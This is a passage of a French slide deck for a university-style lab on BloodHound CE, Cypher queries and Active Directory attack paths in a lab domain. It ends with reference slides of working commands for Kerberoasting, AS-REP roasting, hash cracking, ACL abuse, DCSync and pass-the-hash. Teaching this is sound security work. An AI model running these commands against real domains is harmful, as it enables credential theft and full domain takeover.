+)
+RETURN [n IN nodes(p) | n.name] AS noeuds,
+       [r IN relationships(p) | type(r)] AS relations
+
+-- Tous les chemins les plus courts (pas seulement un seul)
+MATCH p = allShortestPaths(
+  (start:User {name:'OLLIE_HOUSTON@LAB.LOCAL'})-[*1..10]->(end:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
+)
+RETURN p LIMIT 5</code></pre>
+  <div class="warnbox" style="font-size:0.85em;">
+    <code>[*1..]</code> = longueur variable (1 ou plus). <code>[*1..5]</code> = 1 à 5 sauts. Sans borne supérieure, Neo4j peut partir en timeout sur de grands graphes - toujours borner avec <code>..10</code> ou moins.
+  </div>
+</section>
+
+
+<section>
+  <h2>Cypher - WITH et requêtes chaînées</h2>
+  <pre><code class="language-cypher">-- WITH : passer des résultats d'une clause à la suivante (comme un pipe)
+-- [Neo4j Browser] Groupes avec plus de 10 membres - retourne noms et comptage
+MATCH (u:User)-[:MemberOf]->(g:Group)
+WITH g, count(u) AS nb_membres
+WHERE nb_membres > 10
+RETURN g.name, nb_membres
+ORDER BY nb_membres DESC
+
+-- [BH CE + Neo4j Browser] DA et comptes qui ont des droits sur eux
+-- RETURN attacker, victim s'affiche dans BH ; avec .name uniquement dans Neo4j Browser
+MATCH (da:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@LAB.LOCAL'})
+WITH collect(da) AS da_list
+MATCH (attacker)-[r]->(victim)
+WHERE victim IN da_list
+  AND type(r) IN ['GenericAll','WriteDACL','ForceChangePassword','WriteOwner']
+RETURN attacker.name, type(r) AS droit, victim.name</code></pre>
+  <div class="infobox" style="font-size:0.87em;">
+    <code>WITH</code> est l'équivalent d'une sous-requête ou d'un <code>INTO</code> en SQL. Il permet de filtrer sur des valeurs agrégées (<code>count</code>, <code>collect</code>) et de chaîner plusieurs patterns.
+  </div>
+</section>
+
+
+<section>
+  <h2>Cypher - Récapitulatif des clauses</h2>
+  <table>
+    <thead><tr><th>Clause</th><th>Rôle</th><th>Équivalent SQL</th></tr></thead>
+    <tbody>
+      <tr><td><code>MATCH</code></td><td>Définir le motif à chercher dans le graphe</td><td><code>FROM ... JOIN</code></td></tr>
+      <tr><td><code>OPTIONAL MATCH</code></td><td>Comme MATCH mais retourne NULL si pas de résultat</td><td><code>LEFT JOIN</code></td></tr>
+      <tr><td><code>WHERE</code></td><td>Filtrer les résultats du MATCH</td><td><code>WHERE</code></td></tr>
+      <tr><td><code>RETURN</code></td><td>Choisir ce qui est retourné</td><td><code>SELECT</code></td></tr>
+      <tr><td><code>WITH</code></td><td>Passer des résultats à la clause suivante</td><td><code>INTO / HAVING</code></td></tr>
+      <tr><td><code>ORDER BY</code></td><td>Trier les résultats</td><td><code>ORDER BY</code></td></tr>
+      <tr><td><code>LIMIT</code></td><td>Limiter le nombre de résultats</td><td><code>LIMIT / TOP</code></td></tr>
+      <tr><td><code>SKIP</code></td><td>Ignorer les N premiers résultats</td><td><code>OFFSET</code></td></tr>
+      <tr><td><code>DISTINCT</code></td><td>Éliminer les doublons</td><td><code>DISTINCT</code></td></tr>
+    </tbody>
+  </table>
+  <div class="infobox" style="margin-top:0.35em;font-size:0.87em;">
+    Fonctions utiles : <code>count(n)</code>, <code>collect(n.name)</code>, <code>size(list)</code>, <code>type(r)</code>, <code>labels(n)</code>, <code>nodes(path)</code>, <code>relationships(path)</code>, <code>toLower(str)</code>, <code>toString(val)</code>
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     EXERCICES CYPHER - NIVEAU 1 (très guidés)
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#001a00 0%,#003300 100%)" class="ctr">
+  <p class="part-number" style="color:var(--green);">Exercices Cypher - Niveau 1</p>
+  <h1 style="color:#fff;font-size:1.6em;">Prise en main</h1>
+  <p style="color:#aaa;font-size:0.85em;">Requêtes très guidées - onglet <em>Raw Query</em> de BloodHound CE</p>
+</section>
+
+
+<section>
+  <h2>Exercices 1 à 4 - Premiers pas</h2>
+  <p style="font-size:0.72em;color:#888;margin-bottom:0.3em;">
+    <span class="tag tag-g">BH CE</span> = retourner des noeuds/chemins &nbsp;|&nbsp;
+    <span class="tag tag-b">Neo4j :7474</span> = retourner des scalaires (noms, comptages, listes)
+  </p>
+  <div class="exo">
+    <div class="exo-title">Exercice 1 - Explorer le graphe <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Comptez le nombre de noeuds par type dans la base. Combien y a-t-il de <code>User</code> ? de <code>Computer</code> ? de <code>Group</code> ?</div>
+    <div class="hint"><code>MATCH (n:User) RETURN count(n)</code> - répétez pour chaque type</div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 2 - Lister des noeuds <span class="tag tag-g">BH CE</span> <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Affichez les 10 premiers utilisateurs dans le graphe (<code>RETURN n</code>). Puis listez uniquement leurs noms (<code>RETURN n.name</code>) - cette seconde requête nécessite Neo4j Browser.</div>
+    <div class="hint"><code>MATCH (n:User) RETURN n LIMIT 10</code> puis <code>RETURN n.name LIMIT 10</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 3 - Trouver un utilisateur précis <span class="tag tag-g">BH CE</span></div>
+    <div class="exo-body">Trouvez le noeud <code>MARIE_CANTRELL@LAB.LOCAL</code> dans BloodHound. Cliquez sur le noeud pour voir ses propriétés dans le panneau latéral.</div>
+    <div class="hint"><code>MATCH (n:User {name: '...'}) RETURN n</code> - n'oubliez pas le format MAJUSCULES@DOMAINE</div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 4 - Filtrer par propriété booléenne <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Combien de comptes utilisateurs sont <strong>désactivés</strong> ? Listez leurs noms (les 20 premiers).</div>
+    <div class="hint"><code>WHERE n.enabled = FALSE</code></div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Exercices 5 à 8 - Filtres et agrégations <span class="tag tag-b">Neo4j :7474</span></h2>
+  <div class="exo">
+    <div class="exo-title">Exercice 5 - Plusieurs propriétés dans RETURN</div>
+    <div class="exo-body">Pour les 15 premiers utilisateurs activés, retournez : nom, statut activé, admincount, et si leur mot de passe n'expire jamais (<code>pwdneverexpires</code>).</div>
+    <div class="hint"><code>RETURN n.name, n.enabled, n.admincount, n.pwdneverexpires</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 6 - Compter avec filtre</div>
+    <div class="exo-body">Combien de comptes utilisateurs activés ont le mot de passe configuré pour ne jamais expirer ? Combien ont le bit <code>admincount</code> à <code>true</code> ?</div>
+    <div class="hint">Deux requêtes séparées avec <code>WHERE n.enabled = TRUE AND n.XXX = TRUE</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 7 - Trier et ordonner</div>
+    <div class="exo-body">Listez tous les groupes du domaine, triés alphabétiquement. Combien y en a-t-il au total ?</div>
+    <div class="hint"><code>MATCH (g:Group) RETURN g.name ORDER BY g.name</code> - puis avec <code>count()</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 8 - Regrouper par catégorie</div>
+    <div class="exo-body">Combien de membres (utilisateurs directs) chaque groupe contient-il ? Affichez les 10 groupes avec le plus de membres, du plus grand au plus petit.</div>
+    <div class="hint"><code>MATCH (u:User)-[:MemberOf]->(g:Group) RETURN g.name, count(u) AS nb ORDER BY nb DESC LIMIT 10</code></div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Exercices 9 à 12 - Relations</h2>
+  <div class="exo">
+    <div class="exo-title">Exercice 9 - Relation simple <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">De quels groupes MARIE_CANTRELL est-elle membre (directement) ? Listez les noms des groupes.</div>
+    <div class="hint"><code>MATCH (u:User {name:'MARIE_CANTRELL@LAB.LOCAL'})-[:MemberOf]->(g:Group) RETURN g.name</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 10 - Membres directs ET indirects <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Listez tous les utilisateurs membres du groupe <code>DOMAIN ADMINS@LAB.LOCAL</code>, en incluant les membres indirects (via groupes imbriqués). Y en a-t-il plus que par la requête directe ?</div>
+    <div class="hint"><code>[:MemberOf*1..]</code> pour la récursivité</div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 11 - Type de relation <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Trouvez toutes les relations (arêtes) partant du compte <code>OLLIE_HOUSTON@LAB.LOCAL</code>. Quel type de droit possède-t-il sur quel objet ?</div>
+    <div class="hint"><code>MATCH (u:User {name:'OLLIE_HOUSTON@LAB.LOCAL'})-[r]->(dst) RETURN type(r), dst.name, labels(dst)</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 12 - Inbound et Outbound <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Qui a des droits sur <code>AHMED_ROBLES@LAB.LOCAL</code> ? Listez les sources et les types de droits (<em>inbound</em> : qui peut contrôler ce compte).</div>
+    <div class="hint">Inverser la direction : <code>(src)-[r]->(u:User {name:'AHMED_ROBLES@LAB.LOCAL'})</code></div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Exercices 13 à 15 - Chemins</h2>
+  <div class="exo">
+    <div class="exo-title">Exercice 13 - Comptes vulnérables <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Listez tous les utilisateurs activés dont la pré-authentification Kerberos est désactivée (AS-REP Roastable). Combien y en a-t-il ? Certains ont-ils <code>admincount = true</code> ?</div>
+    <div class="hint">Propriété : <code>dontreqpreauth = TRUE</code> - combiner avec <code>enabled = TRUE</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 14 - Comptes avec SPN <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">Listez tous les comptes utilisateurs activés Kerberoastable (avec SPN). Pour chacun, indiquez s'il est protégé par AdminSDHolder (<code>admincount</code>).</div>
+    <div class="hint">Propriété : <code>hasspn = TRUE</code></div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">Exercice 15 - Chemin vers Domain Admin <span class="tag tag-g">BH CE</span> <span class="tag tag-b">Neo4j :7474</span></div>
+    <div class="exo-body">
+      Trouvez le chemin le plus court entre <code>OLLIE_HOUSTON@LAB.LOCAL</code> et le groupe <code>DOMAIN ADMINS@LAB.LOCAL</code>.<br>
+      Dans BloodHound CE (<code>RETURN p</code>) : visualisez le chemin dans le graphe.<br>
+      Dans Neo4j Browser : extrayez les noms des noeuds et les types de relations avec <code>nodes(p)</code> et <code>relationships(p)</code>.
+    </div>
+    <div class="hint"><code>shortestPath((start:User {...})-[*1..10]->(end:Group {...}))</code></div>
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE B - RECON OFFENSIVE
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#1a0000 0%,#3a0000 100%)" class="ctr">
+  <p class="part-number">Partie B</p>
+  <h1 style="color:#fff;font-size:1.8em;">Reconnaissance offensive</h1>
+  <p style="color:var(--red);font-size:0.9em;">Identifier les cibles · Cartographier les chemins · Analyser les ACE</p>
+</section>
+
+
+<section>
+  <h2>Méthodologie de reconnaissance BloodHound</h2>
+  <p class="sub" style="margin-bottom:0.3em;">Ordre d'analyse recommandé pour un attaquant avec accès non-privilégié :</p>
+  <div class="mbox" style="font-size:0.72em;">
+    <p class="my">① Comptes vulnérables à l'exploitation offline</p>
+    <p class="mc" style="margin-left:1.5em;">AS-REP Roasting → hashes sans authentification préalable</p>
+    <p class="mc" style="margin-left:1.5em;">Kerberoasting → hashes avec authentification standard</p>
+    <p class="my" style="margin-top:0.3em;">② Compte obtenu - que peut-il faire ?</p>
+    <p class="mc" style="margin-left:1.5em;">Droits sortants (Outbound Object Control) - ACE directes sur d'autres objets</p>
+    <p class="mc" style="margin-left:1.5em;">Appartenance à des groupes avec droits (MemberOf → droits hérités)</p>
+    <p class="my" style="margin-top:0.3em;">③ Cibles prioritaires</p>
+    <p class="mc" style="margin-left:1.5em;">Chemins courts vers Domain Admins, Enterprise Admins, Backup Operators</p>
+    <p class="my" style="margin-top:0.3em;">④ Configurations dangereuses</p>
+    <p class="mc" style="margin-left:1.5em;">Unconstrained Delegation, WriteDACL sur Domain, DCSync directs</p>
+  </div>
+</section>
+
+
+<section>
+  <h2>Exercices B - Cibles offensives</h2>
+  <div class="exo">
+    <div class="exo-title">B1 - Kerberoastable prioritaires</div>
+    <div class="exo-body">Listez les comptes Kerberoastable activés. Triez-les en affichant d'abord ceux avec <code>admincount = true</code> (les plus intéressants). Quel compte est le plus prioritaire ?</div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">B2 - Comptes à risque élevé</div>
+    <div class="exo-body">Listez les comptes activés qui combinent <code>admincount = true</code> et <code>pwdneverexpires = true</code>.<br>
+    Pourquoi cette combinaison représente-t-elle un risque élevé ? Qu'est-ce que <code>admincount</code> indique réellement dans AD ?</div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">B3 - Droits critiques sur l'objet Domaine</div>
+    <div class="exo-body">Quels objets (utilisateurs, groupes, machines) ont un droit <code>WriteDACL</code>, <code>WriteOwner</code> ou <code>DCSync</code> directement sur l'objet <code>Domain</code> <code>LAB.LOCAL</code> ?<br>
+    Ces droits permettent de compromettre l'ensemble du domaine.</div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Exercices B - Chemins d'attaque</h2>
+  <div class="exo">
+    <div class="exo-title">B4 - ForceChangePassword sur membres DA</div>
+    <div class="exo-body">Qui peut forcer un changement de mot de passe sur un membre actuel du groupe Domain Admins ?<br>
+    Vérifiez à la fois les droits directs et les droits hérités via des groupes.</div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">B5 - Chemins en 2 sauts max vers Domain Admins</div>
+    <div class="exo-body">Combien d'utilisateurs non-DA peuvent atteindre le groupe Domain Admins en <strong>au plus 2 relations</strong> ? Listez les 10 premiers et les types de relations qui composent leurs chemins.</div>
+  </div>
+  <div class="exo">
+    <div class="exo-title">B6 - ACE dangereuses sur des objets sensibles</div>
+    <div class="exo-body">Trouvez toutes les ACE <code>GenericAll</code> ou <code>GenericWrite</code> dont la <strong>cible</strong> est membre (direct ou indirect) de Domain Admins.<br>
+    Ces ACE permettent de compromettre un DA sans passer par lui directement.</div>
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE C - 7 SAMOURAÏS
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#0d0d1a 0%,#1a0030 100%)" class="ctr">
+  <p class="part-number" style="color:#a855f7;">Partie C</p>
+  <h1 style="color:#fff;font-size:1.8em;">Les 7 Samouraïs</h1>
+  <p style="color:#a855f7;font-size:0.9em;">Exercice de synthèse - Chaîne d'attaque complète</p>
+</section>
+
+
+<section>
+  <h2>Contexte de l'exercice</h2>
+  <div class="hlbox" style="margin-bottom:0.4em;">
+    <strong>Point de départ :</strong> le compte <code>MARIE_CANTRELL@LAB.LOCAL</code> est identifié comme vulnérable dans BloodHound. Son hash NT vous sera fourni par l'enseignant en début d'exercice.
+  </div>
+  <ul style="font-size:0.92em;">
+    <li>Une <strong>chaîne de 7 comptes</strong> relie ce compte à un Domain Admin. Chaque transition utilise une technique différente.</li>
+    <li>Le <strong>7ème compte</strong> est un Domain Admin. Atteindre son hash NT est l'objectif final.</li>
+    <li>Les comptes intermédiaires sont des utilisateurs BadBlood normaux - rien dans leur nom n'indique leur rôle. C'est à vous de trouver le chemin.</li>
+    <li><strong>Tout l'exercice se fait depuis BloodHound CE.</strong> Vous n'avez pas besoin de contacter le DC : trouvez le chemin, comprenez chaque technique, expliquez comment elle serait exploitée dans un vrai engagement.</li>
+  </ul>
+  <div class="infobox" style="font-size:0.87em;">
+    <strong>Méthode :</strong> commencez par analyser les droits <em>sortants</em> de MARIE_CANTRELL (Outbound Object Control dans le panneau latéral, ou requête Cypher). Identifiez la première relation exploitable, progressez de compte en compte.
+  </div>
+</section>
+
+
+
+
+<section>
+  <h2>Étape 1 - Identifier et exploiter le point d'entrée</h2>
+  <div class="exo">
+    <div class="exo-title">C1 - Premier samouraï : MARIE_CANTRELL</div>
+    <div class="exo-body">
+      Recherchez <code>MARIE_CANTRELL@LAB.LOCAL</code> dans BloodHound.<br>
+      1. Quelle propriété le rend vulnérable à une attaque <strong>offline</strong> (sans contact DC) ?<br>
+      2. Ce compte a-t-il des droits sortants exploitables visibles dans BloodHound ? Quelle est alors la seule action possible avec ses credentials pour progresser dans la chaîne ?<br>
+      3. Écrivez la requête Cypher qui confirme la propriété vulnérable identifiée en (1).
+    </div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Étape 2 - Deuxième samouraï</h2>
+  <div class="warnbox" style="margin-bottom:0.5em;">
+    <strong>Transition implicite :</strong> MARIE_CANTRELL n'a aucun droit AD sur un autre compte - pas d'arête BloodHound vers le suivant.
+    Ses credentials permettent de s'<strong>authentifier au domaine</strong> : tout utilisateur authentifié peut demander un TGS pour n'importe quel compte avec SPN (Kerberoasting).
+    Parmi les comptes Kerberoastables, l'un d'eux a des <strong>droits sortants visibles dans le graphe</strong> - c'est celui à cibler.
+  </div>
+  <div class="exo">
+    <div class="exo-title">C2 - Deuxième samouraï : trouver la cible Kerberoastable</div>
+    <div class="exo-body">
+      Avec les credentials de MARIE_CANTRELL (obtenu à l'étape 1), vous pouvez maintenant vous authentifier au domaine.<br><br>
+      1. Dans BloodHound, identifiez les comptes Kerberoastable (avec SPN) activés.<br>
+      2. Parmi eux, lequel possède des droits sortants exploitables dans le graphe ? Sur quel compte ? De quel type ?<br>
+      3. Pourquoi ce compte est-il intéressant en tant que cible Kerberoastable (type de SPN, contexte) ?
+    </div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Étapes 3 à 6 - Progresser dans la chaîne</h2>
+  <div class="exo">
+    <div class="exo-title">C3 à C6 - Pour chaque étape intermédiaire</div>
+    <div class="exo-body">
+      1. Depuis le compte courant, identifiez comment atteindre le compte suivant. Certains chemins ne sont pas directs.<br>
+      2. Quelle technique d'attaque le chemin BloodHound révèle-t-il ? Qu'est-ce qui rend ce droit exploitable ?<br>
+      3. Écrivez la requête Cypher qui confirme le chemin complet vers le compte suivant.<br>
+      4. Décrivez ce qu'un attaquant ferait concrètement à cette étape.
+    </div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Étape 7 - Domain Admin fait le DCSync</h2>
+  <div class="hlbox" style="margin-bottom:0.35em;">
+    La dernière transition donne accès au <strong>compte Domain Admin lui-même</strong>. C'est sam7 - en tant que DA - qui exécute le DCSync pour démontrer la compromission totale du domaine.
+  </div>
+  <div class="exo">
+    <div class="exo-title">C7 - Dernier samouraï : sam7 fait le DCSync</div>
+    <div class="exo-body">
+      Depuis le 6ème compte compromis (sam6) :<br>
+      1. Quel droit possède sam6 sur sam7 (le Domain Admin) ? Confirmez par requête Cypher.<br>
+      2. En quoi <code>WriteSPN</code> diffère-t-il de <code>GenericWrite</code> ? Pourquoi Shadow Credentials est-il impossible ici ?<br>
+      3. Décrivez la séquence complète : ajout SPN → demande TGS → crack offline → authentification → DCSync.<br>
+      4. Pourquoi sam7 peut-il/elle exécuter un DCSync sans configuration supplémentaire ?
+    </div>
+  </div>
+</section>
+
+
+<section>
+  <h2>Questions de synthèse</h2>
+  <p class="sub" style="margin-bottom:0.45em;">À rendre à l'issue du TP</p>
+  <ol style="font-size:0.92em;">
+    <li>Décrivez la chaîne complète sous la forme :<br>
+        <em>COMPTE1 [technique] → COMPTE2 [technique] → ... → DA</em></li>
+    <li>Pour les étapes 1 et 2 (AS-REP Roasting, Kerberoasting) : pourquoi le hash cracké ne peut-il pas être utilisé directement pour un Pass-the-Hash ? Quelle est la différence entre un hash NT et un hash issu de Kerberoasting ?</li>
+    <li>Les étapes 3 à 6 nécessitent de contacter le DC pour être exécutées. Expliquez pourquoi, et précisez quel protocole est utilisé à chaque fois (LDAP, Kerberos, MS-DRSR...)</li>
+    <li>Quelle mesure de sécurité unique aurait le plus d'impact pour rendre cette chaîne inexploitable ? Justifiez en citant l'étape qu'elle bloquerait en priorité.</li>
+    <li><em>(Facultatif)</em> Citez au moins 3 Event IDs Windows qui auraient pu déclencher des alertes lors de votre attaque (précisez à quelle étape).</li>
+  </ol>
+</section>
+
+
+<!-- =====================================================================
+     BONUS
+     ===================================================================== -->
+<section>
+  <h2>Exercice Bonus - Unconstrained Delegation</h2>
+  <div class="exo">
+    <div class="exo-title">BONUS - SRV-SHARE01 et coercition d'authentification</div>
+    <div class="exo-body">
+      1. Trouvez dans BloodHound les machines (hors DC) avec <code>unconstraineddelegation = TRUE</code>.<br>
+      2. Pourquoi une machine avec ce flag est-elle dangereuse si un DC s'y authentifie ?<br>
+      3. Quelle technique permet de forcer un DC à s'authentifier vers une machine contrôlée ?<br>
+      4. En supposant que vous avez accès à <code>SRV-SHARE01</code>, décrivez la séquence complète pour obtenir un accès Domain Admin.<br>
+      5. Quelle requête Cypher permettrait de trouver toutes les machines avec ce flag dans BloodHound ?
+    </div>
+  </div>
+  <div class="warnbox" style="font-size:0.85em;margin-top:0.4em;">
+    Exercice purement <strong>analytique</strong> - il n'y a pas de serveur réel derrière SRV-SHARE01 dans ce lab. L'objectif est de comprendre et documenter le chemin d'attaque.
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     FICHES DE RÉFÉRENCE
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#111 0%,#1a1a2e 100%)" class="ctr">
+  <p class="part-number" style="color:#888;">Référence</p>
+  <h1 style="color:#fff;font-size:1.7em;">Fiches outils</h1>
+  <p style="color:#888;font-size:0.85em;">Commandes pour un vrai engagement - pour information, pas à exécuter dans ce TP</p>
+</section>
+
+
+<section>
+  <h2>Référence - AS-REP Roasting &amp; Kerberoasting</h2>
+  <pre><code class="language-bash"># AS-REP Roasting - depuis Kali, sans credentials (compte AS-REP Roastable)
+GetNPUsers.py LAB.LOCAL/ -usersfile users.txt -no-pass -dc-ip 192.168.x.x -outputfile asrep.txt
+# Ou directement sur un compte connu :
+GetNPUsers.py LAB.LOCAL/MARIE_CANTRELL -no-pass -dc-ip 192.168.x.x
+
+# AS-REP Roasting - depuis Windows (domaine)
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Crack AS-REP (hashcat mode 18200 = $krb5asrep$23$...)
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+
+# Kerberoasting classique - lister les SPNs et demander les tickets
+GetUserSPNs.py LAB.LOCAL/user:password -request -outputfile kerb.txt -dc-ip 192.168.x.x
+
+# Kerberoasting - depuis Windows (domaine)
+Rubeus.exe kerberoast /tgtdeleg /rc4opsec /outfile:kerb.txt
+
+# Crack Kerberoast RC4 (hashcat mode 13100 = $krb5tgs$23$...)
+hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule</code></pre>
+  <div class="warnbox" style="font-size:0.85em;">
+    Le hash cracké via Kerberoasting est le <strong>mot de passe en clair</strong> du compte de service, pas son hash NT. Pour un Pass-the-Hash, il faut d'abord convertir via Overpass-the-Hash ou se connecter normalement.
+  </div>
+</section>
+
+
+<section>
+  <h2>Référence - Abus des ACE (PowerView)</h2>
+  <pre><code class="language-powershell">$pass = ConvertTo-SecureString 'NouveauMDP123!' -AsPlainText -Force
+
+# ForceChangePassword (sam2 → sam3, via groupe avec ce droit)
+Set-DomainUserPassword -Identity $sam3 -AccountPassword $pass -Credential $sam2_cred
+
+# GenericAll sur Computer (SRV-SHARE01) → Shadow Credentials ou reset du compte machine
+# Option A : Shadow Credentials (Whisker, requiert ADCS)
+Whisker.exe add /target:SRV-SHARE01$ /domain:lab.local /dc:DC01
+# Option B : reset du MDP du compte machine, puis utiliser son NT hash
+Set-ADAccountPassword -Identity 'SRV-SHARE01$' -NewPassword $pass -Reset
+
+# SRV-SHARE01$ a WriteDACL sur sam4 → s'accorder GenericAll puis reset MDP
+Add-DomainObjectAcl -TargetIdentity $sam4 -PrincipalIdentity 'SRV-SHARE01$' `
+                    -Rights All -Credential $comp_cred
+Set-DomainUserPassword -Identity $sam4 -AccountPassword $pass -Credential $comp_cred
+
+# WriteOwner (sam4 → sam5, via groupe avec ce droit)
+Set-DomainObjectOwner  -Identity $sam5 -OwnerIdentity $sam4 -Credential $sam4_cred
+Add-DomainObjectAcl    -TargetIdentity $sam5 -PrincipalIdentity $sam4 `
+                       -Rights All -Credential $sam4_cred
+Set-DomainUserPassword -Identity $sam5 -AccountPassword $pass -Credential $sam4_cred
+
+# WriteDACL direct (sam5 → sam6)
+Add-DomainObjectAcl    -TargetIdentity $sam6 -PrincipalIdentity $sam5 `
+                       -Rights All -Credential $sam5_cred
+Set-DomainUserPassword -Identity $sam6 -AccountPassword $pass -Credential $sam5_cred
+
+# WriteSPN (sam6 → sam7/DA) → Targeted Kerberoasting
+# WriteSPN = WriteProperty sur servicePrincipalName uniquement (Shadow Credentials impossible)
+Set-ADUser -Identity $sam7 -ServicePrincipalNames @{Add='http/fake.lab.local'} `
+           -Credential $sam6_cred
+# Demander le TGS depuis n'importe quel compte authentifié
+GetUserSPNs.py LAB.LOCAL/$sam6:$pass -target-user $sam7 -request -outputfile tgs.txt
+hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt</code></pre>
+</section>
+
+
+<section>
+  <h2>Référence - DCSync &amp; Pass-the-Hash</h2>
+  <pre><code class="language-bash"># DCSync - exécuté EN TANT QUE sam7 (Domain Admin) - aucune config préalable
+# sam7 possède DS-Replication-Get-Changes-All par défaut en tant que DA
+secretsdump.py 'LAB.LOCAL/$sam7:NouveauMDP123!@DC01.lab.local'
+
+# DCSync - Mimikatz (si on a injecté un shell en tant que DA)
+lsadump::dcsync /domain:lab.local /all /csv   # tous les hashes NT du domaine
+lsadump::dcsync /domain:lab.local /user:krbtgt # hash krbtgt → Golden Ticket possible
+
+# Vérifier l'accès avec un hash NT (CrackMapExec)
+crackmapexec smb 192.168.x.x -u $sam7 -H NTHash
+
+# Pass-the-Hash - shell interactif
+psexec.py   -hashes :NTHash LAB.LOCAL/$sam7@192.168.x.x
+wmiexec.py  -hashes :NTHash LAB.LOCAL/$sam7@192.168.x.x
+
+# Pass-the-Hash - Mimikatz (injecte dans un processus)
+sekurlsa::pth /user:$sam7 /domain:LAB.LOCAL /ntlm:NTHash /run:cmd.exe</code></pre>
+</section>
+
+
+<!-- FIN -->
+<section class="ctr" data-background-gradient="linear-gradient(135deg,#0d1117 0%,#161b22 60%,#1a1a2e 100%)">
+  <div style="border:2px solid #a855f7;padding:1.8em 2.5em;border-radius:10px;display:inline-block;min-width:72%;text-align:center;">
+    <h2 style="color:#a855f7;font-size:1.3em;margin-bottom:0.4em;">Fin du TP</h2>
+    <p style="color:#aaa;font-size:0.8em;margin:0.5em 0;">Rendez vos réponses aux questions de synthèse (Partie C)</p>
+    <p style="color:#aaa;font-size:0.8em;margin:0 0 0.5em;">Pour chaque étape : arête BloodHound + requête Cypher</p>
+    <hr style="border:none;border-top:1px solid #333;margin:0.8em 0;">
+    <p style="font-size:0.48em;color:#555;margin:0;">© Volker Carstein - Parabellum Services - 2025-2026</p>
+  </div>
+</section>
+
+
+</div></div>
+
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/notes/notes.js"></script>
+<script>
+  Reveal.initialize({
+    hash: true, slideNumber: 'c/t', transition: 'slide', transitionSpeed: 'fast',
+    controls: true, progress: true, center: false,
+    width: 1280, height: 720, margin: 0.04, minScale: 0.2, maxScale: 2.0,
+    plugins: [ RevealHighlight, RevealNotes ]
+  });
+</script>
+</body>
+</html>
